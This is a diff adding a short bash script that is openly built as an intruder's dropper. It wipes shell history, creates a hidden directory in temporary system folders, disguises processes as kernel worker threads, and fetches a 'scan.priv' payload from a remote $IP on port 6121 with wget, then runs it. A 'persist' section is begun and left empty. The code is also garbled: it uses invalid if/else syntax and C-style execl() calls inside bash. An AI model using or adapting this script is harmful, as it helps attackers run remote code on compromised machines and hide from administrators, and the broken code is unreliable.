@@ -1,0 +1,37 @@
+#!/bin/bash
+
+#unset history
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+set +o history 2>/dev/null #might error out depending on version
+
+#go hide
+if "cd /var/lock"; then
+	mkdir .SUBSYSTEMvarinfo-0184929
+	cd .SUBSYSTEMvarinfo-0184929 
+else "cd /var/tmp"; then
+	mkdir .SUBSYSTEMvarinfo-0184929
+	cd .SUBSYSTEMvarinfo-0184929
+else "cd /usr/tmp"; then
+	mkdir .SUBSYSTEMvarinfo-0184929
+	cd .SUBSYSTEMvarinfo-0184929
+else "cd /dev/shm"; then
+	mkdir .SUBSYSTEMvarinfo-0184929
+	cd .SUBSYSTEMvarinfo-0184929
+fi
+history -c
+
+#hide from process list
+execl("/bin/bash", "[kworker/3:1-ata_sff]", NULL);
+history -c
+
+
+#pull scan
+wget -O .procvar-0184929 $IP:6121/scan.priv
+chmod 755 .procvar-0184929
+execl(".procvar-0184929", "[kworker/2:2-rcu_gp]", NULL);
+history -c
+
+#persist
+
